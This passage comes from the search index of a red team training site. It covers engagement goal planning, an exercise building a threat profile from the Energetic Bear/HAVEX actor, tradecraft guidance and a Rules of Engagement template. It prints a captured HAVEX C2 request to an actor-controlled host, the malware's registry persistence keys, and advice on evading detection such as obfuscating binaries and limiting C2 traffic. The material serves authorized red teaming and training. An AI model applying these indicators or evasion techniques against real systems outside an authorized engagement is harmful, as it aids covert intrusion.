to gain elevated access? "},{"title":"A threat’s ability to access or identify sensitive information","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-access-or-identify-sensitive-information","content":"What ability does a threat have to access sensitive information?What ability does a threat have to identify sensitive information? "},{"title":"A threat’s ability to exfiltrate data outside an organization","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-exfiltrate-data-outside-an-organization","content":"What ability does a threat have to exfiltrate data outside an organization?How much data must be exfiltrated to impact an organization? "},{"title":"A threat’s ability to act undetected for a given time frame","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-act-undetected-for-a-given-time-frame","content":"How long can a threat go undetected?Can a threat achieve its goals undetected?What must a threat do to stimulate a reaction from an organization? "},{"title":"A threat’s ability to perform operational impacts","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-perform-operational-impacts","content":"What impacts can a threat perform against an organization?How can a threat affect X? "},{"title":"Decomposing a Threat","type":0,"sectionRef":"#","url":"docs/Exercises/threat-profile","content":"","keywords":""},{"title":"Description","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#description","content":"This is a group exercise. As a class, we will examine the Energetic Bear threat actor to build a threat profile that can be used during a Red Team engagement "},{"title":"Objectives","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#objectives","content":"Review the Energetic Bear threat actor’s TTPs.Use the information to create a threat that is similar and can be used to support future Red Team engagements.Complete a threat profile "},{"title":"Instructions","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#instructions","content":"Use the Energetic Bear material provided for reference.Modify and adjust the profile to fit your scenario. note This is one of the more difficult exercises to complete. It is not technically difficult, but dives into threat emulation design that many have not explored. There is no right or wrong answer. The exploration and process of decomposing a threat is the most valuable aspect of the exercise. Practice is the best way to understand this process. "},{"title":"Scenario","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#scenario","content":"A client has asked your Red Team to emulate a specific threat. Specifically they are interested in the attacks by Energetic Bear. Goal As professional Red Team, you understand that emulating a specific threat actor is not easy or feasible. Instead of redesigning Energetic Bear, you understand focus should be on the emulation of a threat’s TTPs. This is more valuable that emulating a specific threat actor. The goal is not document the Energetic Bear threat actor but to create a threat profile document using Energetic Bear as inspiration. You will use research on Energetic Bear's TTPs to build out a custom threat profile that is technically feasible and can be used to engage the target with realistic threat TTPs. A complete threat profile will contain details that can be used to plan and design the execution of a threat against a target. These are typically deployed as a command and control channel. We will discuss command and control in more detail later. Use Energetic Bear references, MITRE, ATT&amp;CK, personal experience, and intuition to develop the profile. Remember, this is your interpretation of a threat using a specific threat actor as inspiration. Resources MITRE ATT&amp;CK Framework, https://attack.mitre.org/wiki/Main_PageMITRE ATT&amp;CK Navigator, https://attack.mitre.org/wiki/ATT%26CK_NavigatorDragonfly: Cyberespionage Attacks Against Energy Suppliers, http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdfEnergetic Bear – Crouching Yeti, https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2018/03/09092926/EB-YetiJuly2014-Public.pdfThe Alley of Compromise, https://www.crowdstrike.com/blog/cve-2014-1761-alley-compromise "},{"title":"Threat Profile Example","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#threat-profile-example","content":"Category\tDescriptionDescription\tGeneral mid-tiered threat that uses common offensive tools and techniques. Goal and Intent\tExist in the network to enumerate systems and information in order to maintain Command and Control to support future attacks. Key IOCs\tCobalt Strike HTTPS beacon on TCP 443, Payload: c:\\programdata\\microsoft\\iexplore.exe, Timestamp: 7/13/2009 10:04 PM, MD5: a7705501c5e216b56cf49dcf540184d0 C2 Overview\tHTTPS on port 443 Cobalt Strike Beacon with a five-minute callback time. Calling directly to threat-owned domains. TTPs (Enumeration, Delivery, Lateral Movement, Privilege Escalation, etc.)\tAssumed Breach Model, no initial delivery via exploitation. POST-exploitation via Cobalt Strike commands. Enumeration and lateral movement via Cobalt Strike and native Windows commands. Privilege escalation limited and determined POST-exploitation. Exploitation\tAssumed Breach Model, no exploitation. Persistence\tUser-level persistence using Microsoft Outlook rule triggered by specific email. "},{"title":"Threat Profile Usage","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#threat-profile-usage","content":"Threat profiles typically support the engagement story and are used to describe the technical aspects of a single C2 channel. A single threat profile is used for each C2 channel.  "},{"title":"Highlights from Energetic Bear Threat Actor","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#highlights-from-energetic-bear-threat-actor","content":"Starting in 2010 and ending in 2014, Energetic Bear / Dragonfly / Crouching Yeti malware attacked numerous computers to collect information on industrial control systems in the United States and EuropeSpread out over time and thus difficult to detectThe primary goal was to collect information that impacted the energy and pharmaceutical industriesPossibly nation-state supportedPhishing, watering hole attacksKnown exploits were used (PDF, Java, IE, Word)Compromised ICS web serversHTTP-based C2Specific activities and capabilities "},{"title":"IOCs from the actor Energetic Bear and the HAVEX malware","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#iocs-from-the-actor-energetic-bear-and-the-havex-malware","content":" Actor Associated with the Russian FederationActive over multiple yearsActive primarily during Moscow business hoursTargeted organizations based in the industry control system sectorGoal of gathering intelligence on ICS-based organizationsUse of custom malware Attack and delivery TTPs PhishingWatering holeCompromised web servers Exploitation TTPs PDF exploitsJava and IE exploitsWord exploitsCustom binaries Post-exploitation TTPs Local system enumeration for OS, username, processes, internet history, etc.Scan for known ICS-related portsDLL injection to migrate into explorer.exeCollect Outlook address book informationCollect passwords from browsersSave exfiltrated data to an encrypted file on disk before delivery to the C2 in an HTTP POST request Persistence TTPs Run key registry modifications: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;TmProvider&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;TmProvider&quot;HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry\\&quot;fertger&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\InternetRegistry Copy HAVEX Paylod Delivery  Energetic Bear used three major methods to deliver malware. 1) Malicious PDF via spear-phishingSpear-phishing was used to infect targeted individuals for initial information gathering by delivering malicious PDF documents—in this case, PDF/SWF exploits targeting CVE-2011-0611 to drop malware.3 Even with this running through 2014, older exploits were still valuable. 2) Malicious JAR and HTML via a watering hole attackWatering hole attacks were used to deliver Backdoor.Oldrea by Symantec. These attacks exploited CVE-2013-2465, CVE-2013-1347, and CVE-2012-1723 in Java 6, Java 7, IE 7, and IE 8 to drop the HAVEX malware. The exploits appeared to be modified Metasploit Java exploits built to deliver the HAVEX loader. 3) Legitimate software loadersEnergetic Bear compromised several legitimate ICS vendor websites. Binaries such as camera drivers and PLC management software were modified and made to deliver the HAVEX malware. In order to complete the third attack type, the threat actor had to compromise several ICS vendors' websites. Sometimes called a Strategic Web Compromise (SWC) attack, these have become a favorite attack method from Russian- and Chinese-based threats. In this case, SWC attacks were used to compromise a site that would most likely be visited by customers or users of ICS systems. This made the watering hole or binary compromises much more useful against the targeted victim. Using these three attack types demonstrated an organized and arguably sophisticated threat actor. The team behind this planned and organized a scenario to be successful against its target audience. Once malware was delivered, three major tasks were observed: System enumeration tools collected information, such as the OS version, machine name and username, and file and directory listings.A credential-harvesting tool extracted stored passwords from various web browsers.Secondary implants6 communicated with different C2 infrastructures using custom protocols and payloads executed in memory. References Dragonfly: Cyberespionage Attacks Against Energy Suppliers, http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdfEnergetic Bear - Crouching Yeti, https://media.kasperskycontenthub.com/wp-content/uploads/sites/58/2018/03/09092926/EB-YetiJuly2014-Public.pdf[The Alley of Compromise](https://www.crowdstrike.com/blog/cve-2014-1761-alley-compromise, https://www.crowdstrike.com/blog/cve-2014-1761-alley-compromise) "},{"title":"HAVEX HTTP Request Sample","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#havex-http-request-sample","content":"POST Request POST /wp08/wp-includes/dtcla.php?id=285745296322896178920098FD80-20&amp;v1=038&amp;v2=170393861&amp;q=5265882854508EFCF958F979E4 HTTP/1.1User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19(KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19Host: toons.freesexycomics.comContent-Length: 0Cache-Control: no-cache Copy POST Response HTTP/1.1 200 OKDate: Wed, 22 Jan 2014 13:40:48 GMTContent-Type: text/htmlTransfer-Encoding: chunkedConnection: keep-aliveServer: Apache/1.3.37 (Unix)Cache-Control: no-cache 9f65&lt;html&gt;&lt;head&gt;&lt;mega http-equiv=’CACHE-CONTROL’ content=’NO-CACHE’&gt;&lt;/head&gt;&lt;body&gt;No data!&lt;!--havexQlpoOTFBWSZTWWYvDI0BOsD/////////////////////////////////////////////4oB+93VVXu69DuN7XYzds9yt49Ques[...TRUNCATED ...]+yUW3zfTxWAOstsCwCckdW5 AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eDM92D/8XckU4UJBmLwyNA==havex--&gt;&lt;/body&gt;&lt;/head&gt; Copy In this example from Symantec, several indicators can be identified. The POST request shows several indicators that may be incorporated into an emulated threat: A target PHP file (dtcla.php)Interesting URL parameters (id, v1, v2, q)A potentially interesting User-AgentA target host Like the request, the response has several indicators: A server headerA potentially unique ID (9f65)Base64-encoded data stored between text (havex &lt; base64 &gt; havex) Note: MALWAREMUSTDIE2 posted a great write-up on the HAVEX malware. This provides additional examples of C2 source code and HTTP request/response pairs. References MALWAREMUSTDIE, http://pastebin.com/qCdMwtZ6 "},{"title":"Threat Profile Template","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#threat-profile-template","content":"Category\tDescriptionDescription Goal and Intent Key IOCs C2 Overview TTPs (Enumeration, Delivery, Lateral Movement, Privilege Escalation, etc.) Exploitation Persistence\t  !! Stop Here !! Do not continue until ready for a possible solution.          "},{"title":"Possible Solution","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#possible-solution","content":""},{"title":"Threat Profile Example","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#threat-profile-example-1","content":"Category\tDescriptionDescription\tGeneral mid-tiered threat that uses common offensive tools and techniques. Goal and Intent\tExist in the network to enumerate systems and information in order to maintain Command and Control to support future attacks. Key IOCs\tPowerShell Empire HTTP agent on TCP 80, Location: Memory Resident and PowerShell Script stored in Registry, HTTP matching HAVEX C2 Overview\tHTTPS on port 80 with a 5 second callback. Calling directly to threat-owned domains. TTPs (Enumeration, Delivery, Lateral Movement, Privilege Escalation, etc.)\tInitially delivered during exploitation. POST exploitation delivery via PowerShell commands. Enumeration and lateral movement via PS Empire and native Windows commands. Privilege escalation limited and determined POST exploitation. Exploitation\tSocial Engineering via Phishing, watering hole, and supply chain via compromised web servers Persistence\tPersistence via registry RUN key modification HAVEX HTTP Indicators Parameters: v1=038&amp;v2=170393861&amp;q=5265… Copy Headers: &lt;head&gt;&lt;mega http-equiv='CACHE-CONTROL' content='NO CACHE'&gt;&lt;/head&gt;&lt;body&gt;No Data!&lt;!--havexhavex--&gt;&lt;/body&gt;&lt;/head&gt; Copy "},{"title":"Conclusion","type":1,"pageTitle":"Decomposing a Threat","url":"docs/Exercises/threat-profile#conclusion","content":"In this exercise, you examined the Energetic Bear threat actor in order to design what a threat profile can be. You learned which IOCs are exposed when tools are kept to their default settings.You learned that the testing of tools before use is critical in understanding a tool’s IOC profile.You changed the default IOCs of common security tools.You learned that some tools are easier than others to modify. "},{"title":"References, Templates, and Presentations","type":0,"sectionRef":"#","url":"docs/references_templates_talks","content":"","keywords":""},{"title":"References","type":1,"pageTitle":"References, Templates, and Presentations","url":"docs/references_templates_talks#references","content":"Download the book's file_download Table of Contents Link\tName\tDescription link Threat Get's a Vote\tDig deeper in the need for the threat perspective here. "},{"title":"Templates","type":1,"pageTitle":"References, Templates, and Presentations","url":"docs/references_templates_talks#templates","content":"Link\tName\tDescription file_download operator_log.xlxs\tOperator Log (xlsx) template file_download operator_log.csv\tOperator Log (csv) template file_download redteam_ROE_example.docx\tRule of Engagement template file_download redteam_report_example.docx\tRed Team Report Template "},{"title":"Presentations from the Authors","type":1,"pageTitle":"References, Templates, and Presentations","url":"docs/references_templates_talks#presentations-from-the-authors","content":""},{"title":"Joe Vest","type":1,"pageTitle":"References, Templates, and Presentations","url":"docs/references_templates_talks#joe-vest","content":"Date\tEvent\tTitle\tDescriptionOctober 2021\tThe Hacker Factory Podcast\tCareer Overview\tDiscussion of my journey in infosec September 2021\tWild West Hackin Fest\tWhy we Red Team - The Real Value of Threat Emulation\tA presentation on the true value of threat based engagement to improve security operations ability to deal with real threats September 2021\tSeigeCast\tCobalt Strike Basics\tDiscussion of Cobalt Strike bascis with Tim Medin and Red Seige August 2021\tDef Con 29 Adversary Village\tPanel discussion on Adversary Simulation, Emulation or Purple teaming\tPanel of security professionals July 2021\t401 Access Denied Podcast\tRed Team 101: Offensive Security\tDiscussion on what red teaming is and shedding light on common misconceptions March 2021\tDCP Podcast\tEpisode 4\tIn Episode 4, we talk to Joe Vest from AWS. Joe's extensive background in both detection and red teaming provides a valuable perspective on detection engineering. June 2020\tTest Guild Security Podcast\tProfessional Red Teaming\tDiscussion on professional red teaming May 2020\tDaily Cyber 225 Podcast\tRed Team Discussion\tRed team discussion "},{"title":"Red Team Tradecraft and TTP Guidance","type":0,"sectionRef":"#","url":"docs/Planning/red-team-tradecraft","content":"","keywords":""},{"title":"Guidance","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#guidance","content":"Do\tDon'tLog all significant events\tUse untested tools on a target system Consult with peers\tUse unencrypted channels for C2 Understand tools and technology used\tAttempt to exploit or attack unencrypted websites Perform situational awareness\tExecute from non-executable locations Minimize callback (C2) volume\tDownload restricted datasets Use binaries for initial access  "},{"title":"DO","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#do","content":""},{"title":"LOG ALL SIGNIFICANT ACTIONS (SUCCESSES AND FAILURES)","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#log-all-significant-actions-successes-and-failures","content":"Log, log and log some more! Screenshot all significant actions including successful and failed attempts. One of the most important aspects of the Red Team engagement is the collection of data (a.k.a. logs). It is common that an inexperienced team completes an engagement with subpar documentation. Many actions are not fully captured, some actions are never captured, and often key failures are ignored. Each action performed provides value to the target as well as the target defenders. Incomplete logs prevent the Red Team from providing a complete and accurate depiction of the actions, obstacles, and defensive strengths and weaknesses of the target (i.e. mission failure). There are several methods to ensure logs are appropriately captured and stored: Automated logging of the terminal: All terminal actions logged, timestamped and stored to a predefined location.Tool logs: Most commercial tools have some capability to log actions and produce a raw and/or final report.Custom tools logs: If you write a custom tool/script, it should output a log of actions and results.Operator logs: By far this is the most important log. A log may show the action performed and the result; however, only the operator can accurately note the way the action was performed, what lead them to the decision, and their interpretation of the result.Screenshots: Terminal logs are great for the operator and even better as supporting artifacts; however, they may mean nothing to senior level executives (and even some IT professionals). Screenshots before, during, and following the execution of an action hold much more weight than a terminal log, tool log, or operator log (often if may just be a screenshot of the terminal during execution). "},{"title":"CONSULT WITH PEERS","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#consult-with-peers","content":"No matter how long you have been performing IT or security, consult your peers before taking action. This is especially true during exploitation and command and control setup. Simple mistakes often lead to Red Team discovery too early in the engagement. Look at the command below. The command will be run as part of a tool written to provide general SA on a Linux system. What should the output look like? netstat –antb Copy The command above is a netstat command that can be executed on a Windows host. Linux does not have the &quot;b&quot; option and produces an &quot;invalid option&quot; response. Think about it Have you ever typed ifconfig instead of ipconfig? Have you ever typed rm * in the wrong directory?Have you ever entered credentials only to discover they were &quot;fat fingered&quot; (after access error)? While these are oversimplifications, they represent the need for peer review on tools, C2, setup, execution, and even clean up. "},{"title":"UNDERSTAND THE TOOLS AND TECHNOLOGIES USED","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#understand-the-tools-and-technologies-used","content":"Understand the underlying technology of a tool or technique before using it on an event. Know how the tool or technique interacts with a target, what network traffic it may generate, and what traces it may leave behind. Knowing what a tool does is only one-third of the equation. What does that mean exactly? Let’s quickly look at a few questions and an example. What artifacts does the tool leave behind? - Are any files modified during execution?Are there tales in the network traffic? Now let’s look at psexec (a commonly used tool, but not a recommended tool for Red Teaming a remote system) Depending on how psexec is executed it: Copies a service file to the remote systemEnters a service key into the registryCreates a prefetch fileCreates an entry in the Application Compatibility Cache - Creates a login eventCreates a profile folder for the remote userAttempts to remove service file and key when exiting (not always successful) What happens when using the –e option? –s option? How does this differ from psexec for PowerShell? Psexec is not a bad tool, and Red Team operators will use it. But... it is important to understand the IOCs generated by a tool. Getting caught due to a lack of tool understanding is not something any Red Team operators wants to experience. "},{"title":"PERFORM SITUATIONAL AWARENESS","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#perform-situational-awareness","content":"After gaining access to a remote system perform situational awareness before moving on. Understand the environment you are in (Is the target in scope?)What protections exist on the system or network?What are the risks of being caught and what attack paths does the system provide? - Are there pre-established connections to other network resources?Who is into the system?Who has recently logged into the system? "},{"title":"MINIMIZE CALLBACK (C2) VOLUME","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#minimize-callback-c2-volume","content":"Unless a Host Based protection mechanism is triggered, it is more likely to be discovered or caught by a defenders recognition and/or analysis of traffic on the network. To avoid early detection, it is always good tradecraft to limit the amount of traffic generated during the engagement. There are several general concepts that, if followed, increase the success of the engagement while decreasing the chances of being discovered: Keep traffic internal to a network: One of the most common issues, and one you should always attempt to change, are the limited number of sensors inside a network. Most network protections are currently applied at the boundary.Pivot command and control traffic to a minimal number of outbound sources: Maintain at least two outbound sources for C2 redundancy; however, only use one for operations (considered an interactive tier). The second (a long or short haul tier) is dormant or extremely slow to be used as a backup if/when the primary is discovered.  "},{"title":"DON’T","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#dont","content":""},{"title":"USE UNTESTED TOOLS ON A TARGET SYSTEM","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#use-untested-tools-on-a-target-system","content":"Before using a new tool (script, application, binary, process, etc.) on a target system, it must be tested, undergo an internal vetting process and be added to an official toolset. Does the tool have negative impacts on specific versions of an OS? Works fine on Windows 7 but causes system error in Windows 8?Do you know if/what additional actions the tool performs?Tool creates a covert channel for use inside the network.This tool creates a private tunnel between host on a virtual interface; however, this creates a network conflictEx: target net: 10.10.2.0/24, covert channel net: 10.10.2.0/24 - Hint: Don’t use these! Does the tool try to call home for updates?At start or during a specific operation, the tool tries to poll home for updatesThis can trigger defensive alerts identifying unauthorized persons or software on the network Does the tool attempt to run as a specific user or, worse, create a user/group? Keep these questions in mind before executing untested or unknown tools. "},{"title":"USE UNENCRYPTED CHANNELS FOR C2","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#use-unencrypted-channels-for-c2","content":"Command and control data exiting the network must be encrypted. Clear text data, such as uploading a binary, issuing an operating system command or using a web shell will be detected by an IDS or other network defense if in clear text. It has become common for IPS/IDS to detect specific strings discovered in clear text traffic. For example: &quot;C:\\Windows\\System32&quot; has become a common trigger for investigation. Some defenders have even gone the extra mile in legitimizing a potential threat. Assume the defender uses a remote administration tool on a regular basis. Ignoring recommendation, this traffic is unencrypted. Rather than alert each time the tool is used legitimately, the alert is configured to look for inconsistencies in the text. For example: most attackers are accustomed to typing lowercase commands in windows. The defender ignores &quot;C:\\Windows\\System32&quot; but alerts on &quot;c:\\windows\\system32&quot; Encryption of internal C2 traffic depends upon several different factors: Are there sensors inside the network?Are there other encrypted communications occurring between target systems?Would encrypted traffic stand-out more than unencrypted traffic? Internal encryption is another example of where peers should be consulted to determine the best course of action before deploying C2 further into a network. "},{"title":"ATTEMPT TO EXPLOIT OR ATTACK UNENCRYPTED WEBSITES","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#attempt-to-exploit-or-attack-unencrypted-websites","content":"As tempting as it may be, do not attack unencrypted websites. Simple attacks can trigger IDS. Always know your target IP space. There are likely several websites available for review. Proper reconnaissance and/or coordination should have discovered each. Create a list of sites in your target log. Include IP, URLs, an educated guess at the function, ports, protocols, etc. Important Note! Prior to performing any exploitation and attacks against a web server, refer to your rules of engagement and fully understand: Who actually owns the website?Who owns the system where the website is hosted? Who owns the backend application?Have proper approvals been obtained to test? "},{"title":"EXECUTE FROM NON-EXECUTABLE LOCATIONS","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#execute-from-non-executable-locations","content":"Execution on a Windows environment must occur in a location typical of windows. Executable locations such as c:\\programdata, c:\\progam files, c:\\windows\\ are common. Execution for locations such as c:\\windows\\temp should never occur. "},{"title":"USE BINARIES FOR INITIAL CAPABILITIES","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#use-binaries-for-initial-capabilities","content":"As a general rule, do not drop binaries on the system. Use built-in commands, such as PowerShell, to achieve your goals first. This is not always possible and binaries may be required; however, binaries must be vetted, obfuscated and tested against detection before use. Ensure all other &quot;Do’s and Don’ts&quot; are met for all binaries. Consult a senior operator before dropping any binary. "},{"title":"DOWNLOAD RESTRICTED DATASETS","type":1,"pageTitle":"Red Team Tradecraft and TTP Guidance","url":"docs/Planning/red-team-tradecraft#download-restricted-datasets","content":"NEVER download (or remove from the target network) any PII, HIPPA, PCI, or other restricted datasets. A good rule of thumb is to annotate the type of data, location, access method, and level of access of restricted data in the log. Ensure the log notes include a reference to the type of data discovered for quick reference. Take a screenshot of the displayed filename and location (assuming the file name has no restricted data included). If the operator can screenshot a portion of the dataset without capturing the restricted data, they may do so for proof-of-access; however, DO NOT take screenshots of the data itself! "},{"title":"Operator Log","type":0,"sectionRef":"#","url":"docs/Templates/oplog","content":"","keywords":""},{"title":"Example Operator Log","type":1,"pageTitle":"Operator Log","url":"docs/Templates/oplog#example-operator-log","content":"This operator log example shows the type of detail needed to describe an action taken by a red team operator. Start\tEnd\tSource IP\tDestination IP\tDestination Port\tDestination System\tPivot IP\tPivot Port\tURL\tTool/App\tCommand\tDescription\tOutput\tResult\tSystem Modification\tComments\tOperator Name20161128_151323\t20161128_151341\t10.10.10.10\t192.168.1.12\t80\tpxh1\t10.10.1.1\t80&gt;1480\tNA\tnmap\tproxychains nmap -sT -Pn -n -p80 192.168.1.12\tTest ability for foothold to communicate with internal server\tPorts: 80/open\tSuccessful communication\tNA\tAccess to target server via foothold1\tJoe Snuffy "},{"title":"Download Templates","type":1,"pageTitle":"Operator Log","url":"docs/Templates/oplog#download-templates","content":"file_download Operator Log (xlsx) file_download Operator Log (csv) "},{"title":"ROE Template","type":0,"sectionRef":"#","url":"docs/Templates/roe_template","content":"","keywords":""},{"title":"Executive Summary","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#executive-summary","content":"The Rules of Engagement (ROE) document the approvals, authorizations, and critical implementation issues necessary to execute the engagement. Signing of the ROE constitutes acknowledgement and approval of the customer, system owner, and Red Team of the Red Team’s authorities in execution of the engagement. The objectives include: ( see Appendix for details ) Objective 1Objective 2Objective 3Objective 4 Explicit Restrictions: ( see Appendix for details ) Restriction 1Restriction 2 Authorized Target Space: ( see Appendix for details ) IP Range (or set)DomainsURLsNetwork Segments Activities: ( see Appendix for details ) ReconnaissanceAccess TypesPositioningImpacts "},{"title":"Table of Contents","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#table-of-contents","content":"[ TOC GOES HERE ] "},{"title":"Rules of Engagement Introduction","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#rules-of-engagement-introduction","content":""},{"title":"Purpose","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#purpose","content":"To establish the responsibilities, relationships, and guidelines between the [ Red Team ] Red Team hereafter referred to as [ Red Team ], [ The Customer ], [ System Owner ] , and [ any stakeholders required for engagement execution ] for conducting a Red Team engagement on [ Target Organization, network, or system ] hereafter referred to as [ Target of Engagement ]. The engagement will be conducted from Red Team locations at [ address ] on target systems located at [ IP/Domain, Address ]. "},{"title":"References","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#references","content":"[ Applicable References Here ] PIA...HIPAA ...ISO... "},{"title":"Scope","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#scope","content":"This agreement is applicable to [ business, customer, system, network ] for the receipt of Red Team activities. This document will establish the guidelines, limitations, and restrictions for conducting a Red Team engagement. "},{"title":"Definitions","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#definitions","content":"[ Short definition of terms ] "},{"title":"Rules of Engagement and Support Agreement","type":1,"pageTitle":"ROE Template","url":"docs/Templates/roe_template#rules-of-engagement-and-support-agreement","content":"a. [ Red Team ] has been agreed upon to conduct a Red Team engagement and supporting Red Team activities. This document provides the ground rules for planning, executing and reporting the engagement. b. [ Short description of the services requested and information about the requesting entity ]. The following systems, networks and/or assets will be included: [ List of business/organization systems and networks included ]All software and hardware included as a target during the engagement. c. The Red Team will [ list of activities ] The engagement is designed to [ objectives ]. This means the system must [ whatever the objectives are designed to test/assess/evaluate/stress ].For the Red Team, an open network will be utilized. An open network is defined as a network with access to the Internet.Engagement activities will be conducted using scenarios detailed in the Threat Profile [ Appendix x ].The customer is responsible for [ List of responsibilities ].There will be complete and open coordination with all stakeholders required for engagement execution. Stakeholders are the parties represented by the signatories of this document.Red Team activities are limited to the target of engagement.Red Team tools and activities may be intrusive, but will not intentionally disrupt services outside the authorizations of these Rules of Engagement.The Red Team will provide [ X ] updates ([ list each ]) as follows:Update 1: [ Conditions ]Update 2: [ Conditions ] d. [ Customer ] will: [ Include list of responsibilities ] Provide the Red Team administrative facilities and support for all team personnel as necessary to conduct the engagement (if on-site).Provide support with network and resources for conducting the engagement, including adequate workspace (quiet facility), network drops and power connections for the Red Team’s systems.Provide IP address ranges and administrative support for target of engagement.Coordinate support of Red Team activities, with the appropriate stakeholders.Provide contact information (i.e., names, job titles, phone &amp; email address) to the signatories of this document.Provide to the Red Team the results of the Vulnerability Assessment scans performed prior to the engagement to create the effects of intelligence gathering background efforts expected of a malicious entity. e. Red Team efforts will be coordinated with [ Insert POC position/title ] for the duration of the engagement. The Red Team will target only those hosts and Internet protocol (IP) addresses within the confines and control of the target of engagement network. f. Red Team methods may be intrusive, but should not be destructive, and will be terminated if information is gathered pertaining to an actual intrusion. Red Team is responsible for informing [ Insert POC position/title ] if an actual intrusion is discovered. [ Insert POC position/title ] will report the actual intrusion to the appropriate representative, along with any substantiating information regarding the detected intrusion. g. Red Team operations require the use of exploitation and attack tools and techniques. All tools employed by the Red Team have been extensively tested by the team to ensure they are non-destructive and are under positive control when employed. h. Red Team systems contain exploit tools, code, and technical references, which are not to be viewed, distributed or evaluated by external organizations. i. The Red Team will attempt to gain access to the target of engagement. j. Off-limit IP lists are provided as Appendix [ X ]. This list should only include those IP ranges within the network that are not part of the engagement. k. The Red Team may only conduct activities against client networks that provide sufficient notice to system users that their use of those systems constitutes consent to monitoring. It is the responsibility of the target of engagement legal counsel to review these notice procedures and certify they provide sufficient notice. l. Sensitive information reporting: Vulnerabilities discovered during the engagement that present an immediate risk to life, limb, or eyesight will be reported promptly to [ Insert POC position/title ] to enable immediate response or action. Representatives of the signatories of this ROE will receive follow-on notification as appropriate.Incidental discovery of information that relates to serious crimes such as sabotage, threats, or plans to commit offenses that threaten a life or could cause significant damage to or loss of customer property, and which does not present an immediate risk, will be reported to the applicable local authorities for action.The Red Team reporting is otherwise conducted in a way that does not attribute information or particular activity to an individual.Red Team activities may not be conducted in support of law enforcement or criminal investigation purposes. m. Cease operations process: The Red Team will suspend activity upon detection of computer anomalies that could potentially be unauthorized intrusions into target of environment networks. The Red Team will suspend activity when unintentional information as described above is encountered, and until the appropriate reporting has taken place.All engagement activities operate under the direction of the Engagement Director, who may alter or cease activities as necessary. n. Information usage: The Red Team will not intentionally compromise Privacy of Information Act (PIA), medical, justice, worship or religious pursuit, or any other protected or privileged information. If a compromise does occur, it will be handled through normal procedures. The proper security personnel will be notified immediately.The Red Team is authorized to exploit files, email, and/or message traffic stored on the network, as well as communications transiting the network for analysis specifically related to the accomplishment of their objectives. (e.g., identifying user ID’s, passwords and/or network IP addresses in order to gain further access).The Red Team will not intentionally modify or delete any operational user data, or conduct any Denial of Service attacks. The Red Team will not otherwise intentionally degrade or disrupt normal operations of the targeted systems.The Red Team reporting is conducted in a way that does not attribute information or particular activity, to a specific individual. o. Deconfliction process: All detected information assurance incidents, whether real-world or alleged Red Team activity, should immediately be reported using normal incident reporting processes.The [ the customer ], [ system owner (if different) ] POC may contact the Red Team’s POC to determine if discovered activities are the result of the Red Team. p. Deliverables: The Red team will provide an engagement summary presentation for the target of engagement representatives at the completion of the engagement.The Red Team will provide a written summary of the engagement results to the [ insert POC position/title ] representative within 30 days following completion of the test. "},{"title":"ROE 